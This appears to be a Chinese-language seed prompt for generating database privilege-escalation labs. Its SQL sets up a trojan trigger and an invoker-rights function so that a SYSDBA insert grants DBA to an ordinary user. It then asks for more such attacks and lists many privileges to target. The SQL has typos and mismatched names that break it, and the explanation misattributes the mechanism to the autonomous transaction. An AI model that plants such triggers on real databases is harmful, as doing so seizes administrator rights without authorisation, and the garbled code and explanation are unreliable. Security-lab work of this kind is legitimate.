该测试用例就是Oracle数据库中触发器调用函数提权的例子：
SYSDBA:
```SQL
--登录
CONNECT SYSDBA/SYSDBA;
--创建用户
CREATE USER USER1 IDENTIFIED BY 123456789;
--授予权限
GRANT CREATE SESSION TO USER1;
GARNT CREATE TABLE, CREATE PRODUCURE, CREATE TRIGGER TO USER1;
```

USER1用户:
```SQL
--登录系统
CONNECT USER1/123456789;
--创建表
CREATE TABLE T2(ID INT, NAME VARCHAR(20));

--创建授权函数
CREATE OR REPLACE FUNCTION GRANT_PRIVILEGES
RETURN VARCHAR2
AUTHID CURRENT_USER
IS
    PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
    EXECUTE IMMEDIATE 'GRANT DBA TO USER1';
    COMMIT;
    RETURN 'GRANTED';
END;

--创建触发器，调用函数
CREATE OR REPLACE TRIGGER INSERT_GRANT
AFTER INSERT ON USER1.T2
FOR EACH ROW
BEGIN
 --调用函数
 CALL GRANT_PRIVILEGE();
END;
```

SYSDBA用户:
```SQL
--登录
CONNECT SYSDBA/SYSDBA;
--插入数据，触发触发器进行授权
INSERT INTO USER1.T2 VALUES(1, 'SYSDBA');

--USER1用户
--登录系统
CONNECT USER1/123456789;
--查看权限
SELECT * FROM USER_SYS_PRIVS;
```

由于`GRANT_PRIVILEGES`函数中使用了`PRAGMA AUTONOMOUS_TRANSACTION;`，这使得函数内的事务独立于外部事务。这意味着，即便是没有`DBA`权限的用户也能通过这个独立的事务尝试执行通常不被允许的操作，这里的操作是尝试给自己授予`DBA`角色。

`EXECUTE IMMEDIATE`是PL/SQL中的一个语句，它用于动态地执行一个单条的SQL语句或PL/SQL块，这个语句或块是以字符串的形式提供的。这允许程序在运行时构建并执行不是静态编码在源代码中的SQL语句或PL/SQL代码块。

这里有几个`EXECUTE IMMEDIATE`的主要用途：

1. **动态SQL执行**：在编译时可能不知道具体的SQL语句，或者SQL语句依赖于运行时的条件。例如，基于用户输入构建一个查询。
2. **权限提升**：当一个存储过程或函数以一个用户的权限运行时，它可能需要执行一些该用户在普通情况下没有权限执行的SQL操作。通过`EXECUTE IMMEDIATE`，可以在具有适当权限的存储过程或函数中动态执行这些操作。
3. **绕过编译时的语法检查**：通常，PL/SQL代码在编译时会检查所有的SQL语句确保它们语法上是正确的。使用`EXECUTE IMMEDIATE`，可以在运行时才构造并检查SQL语句。
4. **执行DDL语句**：PL/SQL通常用于执行DML语句（如INSERT、UPDATE、DELETE），但若要执行DDL（如CREATE、ALTER、DROP），必须使用`EXECUTE IMMEDIATE`。


`INSERT_GRANT触发器是由USER1用户创建的，在执行的过程中默认使用的是创建者的权限，但是如果在触发器中又调用了函数，那么在执行的时候，使用的是调用者的权限。

触发器的触发时机：
    BEFORE INSERT: 在插入数据之前执行触发器内部逻辑
    AFTER INSERT: 在插入数据之后执行触发器内部逻辑
    BEFORE UPDATE: 在更新数据之前执行触发器内部逻辑
    AFTER UPDATE: 在更新数据之后执行触发器内部逻辑
    BEFORE DELETE: 在删除数据之前执行触发器内部逻辑
    AFTER DELETE: 在删除数据之后执行触发器内部逻辑
    INSTEAD OF INSERT: 在执行插入时，使用触发器内部逻辑来替换掉插入语句的标准操作
    INSTEAD OF UPDATE: 在执行更新时，使用触发器内部逻辑来替换掉更新语句的标准操作
    INSTEAD OF DELETE: 在执行删除时，使用触发器内部逻辑来替换掉删除语句的标准操作
除此之外，也会存在一些组合情况，比如BEFORE INSERT OR DELETE等等。

这是一个很典型的数据库提权实验，需要继续生成类似的提权实验，涉及到的其他权限还可以包括，可以选择其中的一个或多个权限并生成相应的对象：
ADMIN ANY DATABASE PRIVILEGE
ADMIN ANY ROLE
ADMIN BUFFER
ADMIN JOB
ADMIN REPLAY
ALTER ANY CONTEXT INDEX
ALTER ANY INDEX
ALTER ANY MATERIALIZED VIEW
ALTER ANY SCHEMA
ALTER ANY SEQUENCE
ALTER ANY TABLE
ALTER ANY TRIGGER
ALTER ANY VIEW
ALTER CONTEXT INDEX
ALTER DATABASE
ALTER INDEX
ALTER MATERIALIZED VIEW
ALTER PROFILE
ALTER REPLICATE
ALTER SEQUENCE
ALTER TABLE
ALTER TABLESPACE
ALTER TRIGGER
ALTER USER
ALTER VIEW
BACKUP DATABASE
COMMENT ANY TABLE
CREATE ANY CONTEXT
CREATE ANY CONTEXT INDEX
CREATE ANY DIRECTORY
CREATE ANY DOMAIN
CREATE ANY INDEX
CREATE ANY LINK
CREATE ANY MATERIALIZED VIEW
CREATE ANY OPERATOR
CREATE ANY PACKAGE
CREATE ANY PARTITION GROUP
CREATE ANY PROCEDURE
CREATE ANY SCHEMA
CREATE ANY SEQUENCE
CREATE ANY SYNONYM
CREATE ANY TABLE
CREATE ANY TRIGGER
CREATE ANY VIEW
CREATE CONTEXT INDEX
CREATE DOMAIN
CREATE INDEX
CREATE LINK
CREATE MATERIALIZED VIEW
CREATE OPERATOR
CREATE PACKAGE
CREATE PARTITION GROUP
CREATE PROCEDURE
CREATE PROFILE
CREATE PUBLIC SYNONYM
CREATE REPLICATE
CREATE ROLE
CREATE SCHEMA
CREATE SEQUENCE
CREATE SESSION
CREATE SYNONYM
CREATE TABLE
CREATE TABLESPACE
CREATE TRIGGER
CREATE USER
CREATE VIEW
DELETE ANY TABLE
DELETE ANY VIEW
DELETE TABLE
DELETE VIEW
DROP ANY CONTEXT
DROP ANY CONTEXT INDEX
DROP ANY DIRECTORY
DROP ANY DOMAIN
DROP ANY INDEX
DROP ANY LINK
DROP ANY MATERIALIZED VIEW
DROP ANY OPERATOR
DROP ANY PACKAGE
DROP ANY PARTITION GROUP
DROP ANY PROCEDURE
DROP ANY SCHEMA
DROP ANY SEQUENCE
DROP ANY SYNONYM
DROP ANY TABLE
DROP ANY TRIGGER
DROP ANY VIEW
DROP CHARACTER SET
DROP COLLATION
DROP CONTEXT INDEX
DROP DOMAIN
DROP INDEX
DROP LINK
DROP MATERIALIZED VIEW
DROP OPERATOR
DROP PACKAGE
DROP PARTITION GROUP
DROP PROCEDURE
DROP PROFILE
DROP PUBLIC SYNONYM
DROP REPLICATE
DROP ROLE
DROP SCHEMA
DROP SEQUENCE
DROP SYNONYM
DROP TABLE
DROP TABLESPACE
DROP TRIGGER
DROP USER
DROP VIEW
DUMP ANY TABLE
DUMP TABLE
EXECUTE ANY PACKAGE
EXECUTE ANY PROCEDURE
EXECUTE PACKAGE
EXECUTE PROCEDURE
FLASHBACK ANY TABLE
FLASHBACK TABLE
GRANT ANY CONTEXT
GRANT ANY DOMAIN
GRANT ANY OBJECT PRIVILEGE
GRANT ANY PACKAGE
GRANT ANY PROCEDURE
GRANT ANY TABLE
GRANT ANY VIEW
GRANT CONTEXT
GRANT DOMAIN
GRANT PACKAGE
GRANT PROCEDURE
GRANT TABLE
GRANT VIEW
INSERT ANY TABLE
INSERT ANY VIEW
INSERT TABLE
INSERT VIEW
REFERENCES ANY TABLE
REFERENCES TABLE
RESOURCE CREATE SCHEMA
RESTORE DATABASE
SELECT ANY DICTIONARY
SELECT ANY MATERIALIZED VIEW
SELECT ANY SEQUENCE
SELECT ANY TABLE
SELECT ANY VIEW
SELECT MATERIALIZED VIEW
SELECT SEQUENCE
SELECT TABLE
SELECT VIEW
UNLIMITED TABLESPACE
UPDATE ANY TABLE
UPDATE ANY VIEW
UPDATE TABLE
UPDATE VIEW
USAGE ANY DOMAIN
USAGE ANY PARTITION GROUP
USAGE DOMAIN
USAGE PARTITION GROUP